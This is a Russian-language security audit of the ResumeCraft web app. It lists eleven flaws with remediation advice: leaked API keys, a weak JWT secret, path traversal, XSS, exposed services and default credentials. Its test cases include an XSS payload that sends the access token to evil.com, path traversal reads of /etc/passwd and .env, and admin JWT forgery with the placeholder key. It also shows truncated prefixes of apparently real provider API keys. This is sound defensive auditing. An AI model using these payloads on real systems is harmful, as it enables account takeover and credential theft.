# QA Report #01 — КРИТИЧЕСКИЕ УЯЗВИМОСТИ БЕЗОПАСНОСТИ

**Проект:** ResumeCraft v1.5
**Дата:** 2026-03-06
**Тестировщик:** QA Engineer (10+ лет опыта)
**Severity:** 🔴 CRITICAL / 🟠 HIGH
**Метод:** Статический анализ исходного кода + ревью конфигураций

---

## SEC-001: Реальные API-ключи в файле .env (CRITICAL)

**Severity:** 🔴 CRITICAL
**Файл:** `.env` (строки 35–45)
**Категория:** Утечка секретов / CWE-798 (Hardcoded Credentials)

### Описание
Файл `.env` содержит **настоящие API-ключи** четырёх LLM-провайдеров в открытом виде:

- `GIGACHAT_CREDENTIALS=MDU2NDkwYjUtODc1OS00...` (base64-encoded client credentials)
- `OPENAI_API_KEY=sk-proj-a5W-j_XCfb...` (OpenAI project key)
- `OPENROUTER_API_KEY=sk-or-v1-42b0e8f8bcb...` (OpenRouter)
- `ANTHROPIC_API_KEY=sk-ant-api03-Oge6dlQADqx...` (Anthropic Claude)

### Шаги воспроизведения
1. Открыть файл `.env` в корне проекта
2. Убедиться, что ключи являются реальными (формат соответствует живым ключам)

### Ожидаемое поведение
- `.env` должен содержать только placeholder-значения (например, `OPENAI_API_KEY=your-key-here`)
- Реальные ключи хранятся в системе управления секретами (Vault, AWS Secrets Manager, etc.)

### Фактическое поведение
Реальные ключи находятся в файле, который потенциально может попасть в Git-репозиторий.

### Риск
- **Финансовые потери:** несанкционированное использование API → счета на $1000+
- **Компрометация данных:** через API-ключи можно получить доступ к данным пользователей, обрабатываемым через LLM

### Рекомендация
1. **НЕМЕДЛЕННО** отозвать все скомпрометированные ключи
2. Перегенерировать ключи у каждого провайдера
3. Использовать `.env.example` с placeholder-ами
4. Внедрить систему управления секретами (HashiCorp Vault / AWS SSM)

### Статус .gitignore
`.env` присутствует в `.gitignore` (строка 138), однако если файл **уже был закоммичен** ранее, `.gitignore` не удалит его из истории. Необходим `git filter-branch` или `BFG Repo-Cleaner`.

---

## SEC-002: Слабый SECRET_KEY (CRITICAL)

**Severity:** 🔴 CRITICAL
**Файл:** `.env` (строка 25)
**Категория:** CWE-321 (Use of Hard-coded Cryptographic Key)

### Описание
```
SECRET_KEY=change-me-to-random-64-char-string-in-production
```

Это placeholder-строка, НЕ случайный ключ. Если сервер запущен с этим значением:
- Любой может сгенерировать валидный JWT для любого пользователя
- Полная компрометация аутентификации

### Тест-кейс
```python
import jwt
token = jwt.encode({"sub": "admin-uuid", "type": "access"},
                   "change-me-to-random-64-char-string-in-production",
                   algorithm="HS256")
# token будет принят сервером как валидный
```

### Рекомендация
- Генерировать `SECRET_KEY` через `python -c "import secrets; print(secrets.token_hex(64))"`
- Добавить валидацию при старте: отказ запуска если `SECRET_KEY` содержит слово "change"

---

## SEC-003: Swagger UI доступен в production (HIGH)

**Severity:** 🟠 HIGH
**Файл:** `src/app/main.py` (строки 49–50)
**Категория:** CWE-200 (Information Exposure)

### Описание
```python
app = FastAPI(
    docs_url='/docs',       # Swagger UI
    redoc_url='/redoc',     # ReDoc
)
```

Swagger UI доступен по адресу `https://resumecraft.ru/docs` **без проверки окружения**. Это раскрывает:
- Полную схему API (все эндпоинты, параметры, типы)
- Модели данных
- Возможность отправлять запросы прямо из интерфейса

### Ожидаемое поведение
```python
docs_url='/docs' if not settings.is_production else None,
redoc_url='/redoc' if not settings.is_production else None,
```

### Рекомендация
Отключить Swagger в production или закрыть через Basic Auth / IP whitelist.

---

## SEC-004: Stateless Logout — JWT не инвалидируется (HIGH)

**Severity:** 🟠 HIGH
**Файл:** `src/app/auth/router.py` (эндпоинт `/auth/logout`)
**Категория:** CWE-613 (Insufficient Session Expiration)

### Описание
Эндпоинт logout возвращает 204 No Content **без какой-либо серверной логики**:
```python
async def logout(_current_user: User = Depends(get_current_user)) -> Response:
    # TODO: jti blacklist планируется в Phase 2
    return Response(status_code=status.HTTP_204_NO_CONTENT)
```

### Последствия
- Украденный access token (время жизни: 30 минут) остаётся валидным после «выхода»
- Украденный refresh token (время жизни: 30 дней) остаётся валидным
- Невозможно «разлогинить» скомпрометированную сессию

### Тест-кейс
1. Авторизоваться, получить access_token
2. Вызвать `POST /api/v1/auth/logout`
3. Использовать тот же access_token — **запрос будет принят**

### Рекомендация
Внедрить JWT blacklist через Redis:
```python
redis.setex(f"blacklist:{jti}", ttl_seconds, "1")
```

---

## SEC-005: Отсутствие Rate Limiting (HIGH)

**Severity:** 🟠 HIGH
**Файлы:** Все роутеры
**Категория:** CWE-307 (Improper Restriction of Excessive Authentication Attempts)

### Описание
Ни один эндпоинт не имеет ограничения частоты запросов. Критичные точки:

| Эндпоинт | Риск |
|----------|------|
| `POST /auth/login` | Brute-force пароля |
| `POST /auth/register` | Массовая регистрация ботов |
| `POST /auth/refresh` | Flood refresh-запросами |
| `POST /rewrite` | Exhaustion API-ключей LLM ($$$) |
| `GET /vacancies/search` | DDoS hh.ru через прокси |

### Рекомендация
```python
from slowapi import Limiter
limiter = Limiter(key_func=get_remote_address)
# login: 5 req/min, register: 3 req/min, rewrite: 10 req/hour
```

---

## SEC-006: Path Traversal в FileStorage (HIGH)

**Severity:** 🟠 HIGH
**Файл:** `src/app/core/storage.py` (строка 41)
**Категория:** CWE-22 (Path Traversal)

### Описание
```python
async def read(self, relative_path: str) -> bytes:
    file_path = self._base_dir / relative_path  # Нет санитизации!
    if not file_path.exists():
        raise FileNotFoundError(...)
    return file_path.read_bytes()
```

`relative_path` не проверяется на `..` (directory traversal). Если атакующий контролирует `relative_path`, он может прочитать произвольные файлы:

### Тест-кейс
```python
storage.read("../../etc/passwd")       # Linux
storage.read("../../../.env")           # Чтение API-ключей
```

### Рекомендация
```python
async def read(self, relative_path: str) -> bytes:
    file_path = (self._base_dir / relative_path).resolve()
    if not str(file_path).startswith(str(self._base_dir.resolve())):
        raise PermissionError("Access denied: path traversal detected")
    ...
```

---

## SEC-007: XSS через dangerouslySetInnerHTML (HIGH)

**Severity:** 🟠 HIGH
**Файлы:** `frontend/src/pages/wizard/VacancyPage.tsx` (строки 392, 400, 410), `ResultsPage.tsx` (строка 394)
**Категория:** CWE-79 (Cross-Site Scripting)

### Описание
Данные вакансий от hh.ru API отображаются через `dangerouslySetInnerHTML` **без санитизации**:
```jsx
dangerouslySetInnerHTML={{ __html: detailVacancy.description }}
dangerouslySetInnerHTML={{ __html: detailVacancy.snippet.requirement }}
dangerouslySetInnerHTML={{ __html: detailVacancy.snippet.responsibility }}
```

Если API hh.ru вернёт вредоносный HTML (или если данные подменены через MITM):
```html
<img src=x onerror="fetch('https://evil.com/steal?token='+localStorage.getItem('access_token'))">
```

### Рекомендация
Использовать DOMPurify:
```jsx
import DOMPurify from 'dompurify'
dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(detailVacancy.description) }}
```

---

## SEC-008: JWT-токен в localStorage (HIGH)

**Severity:** 🟠 HIGH
**Файлы:** `frontend/src/services/api.ts` (строка 8), `frontend/src/contexts/AuthContext.tsx`
**Категория:** CWE-922 (Insecure Storage of Sensitive Information)

### Описание
```typescript
if (token) localStorage.setItem('access_token', token)
```

localStorage доступен любому JavaScript на странице. В сочетании с XSS (SEC-007) это позволяет украсть токен.

### Рекомендация
Хранить refresh token в HttpOnly cookie; access token — только в памяти (React state).

---

## SEC-009: Одинаковый ключ для Access и Refresh токенов (MEDIUM)

**Severity:** 🟡 MEDIUM
**Файл:** `src/app/core/security.py`

### Описание
Оба типа токенов подписываются одним `settings.secret_key`. Компрометация одного ключа означает компрометацию обоих типов токенов.

### Рекомендация
Использовать разные ключи или асимметричную подпись (RS256 вместо HS256).

---

## SEC-010: Docker — сервисы открыты на всех интерфейсах (MEDIUM)

**Severity:** 🟡 MEDIUM
**Файл:** `docker-compose.yml`

### Описание
```yaml
db:
  ports: ["5432:5432"]     # PostgreSQL доступен снаружи
redis:
  ports: ["6379:6379"]     # Redis доступен снаружи
rabbitmq:
  ports: ["15672:15672"]   # RabbitMQ Management Console
flower:
  ports: ["5555:5555"]     # Celery Flower (без авторизации)
```

Все инфраструктурные порты проброшены на `0.0.0.0`.

### Рекомендация
- Привязать к `127.0.0.1:5432:5432`
- Flower и RabbitMQ Management закрыть через VPN или Basic Auth
- В production использовать Docker network без проброса портов

---

## SEC-011: RabbitMQ с дефолтными credentials (MEDIUM)

**Severity:** 🟡 MEDIUM
**Файл:** `docker-compose.yml` (строки 114–115)

```yaml
RABBITMQ_DEFAULT_USER: guest
RABBITMQ_DEFAULT_PASS: guest
```

### Рекомендация
Сменить credentials через переменные окружения.

---

## Сводная таблица

| ID | Severity | Описание | Файл | Статус v1.6 |
|----|----------|----------|------|-------------|
| SEC-001 | 🔴 CRITICAL | Реальные API-ключи в .env | `.env` | ⏳ Phase 2 |
| SEC-002 | 🔴 CRITICAL | Слабый SECRET_KEY | `.env` | ✅ FIXED |
| SEC-003 | 🟠 HIGH | Swagger UI в production | `main.py` | ✅ FIXED |
| SEC-004 | 🟠 HIGH | Stateless Logout (JWT не инвалидируется) | `auth/router.py` | ⏳ Phase 2 |
| SEC-005 | 🟠 HIGH | Нет Rate Limiting | все роутеры | ✅ FIXED |
| SEC-006 | 🟠 HIGH | Path Traversal в FileStorage | `storage.py` | ✅ FIXED |
| SEC-007 | 🟠 HIGH | XSS через dangerouslySetInnerHTML | `VacancyPage.tsx` | ✅ FIXED |
| SEC-008 | 🟠 HIGH | JWT в localStorage | `api.ts` | ⏳ Phase 2 |
| SEC-009 | 🟡 MEDIUM | Один ключ для access/refresh | `security.py` | ⏳ Phase 2 |
| SEC-010 | 🟡 MEDIUM | Docker порты открыты на 0.0.0.0 | `docker-compose.yml` | ✅ FIXED |
| SEC-011 | 🟡 MEDIUM | RabbitMQ guest/guest | `docker-compose.yml` | ✅ FIXED |
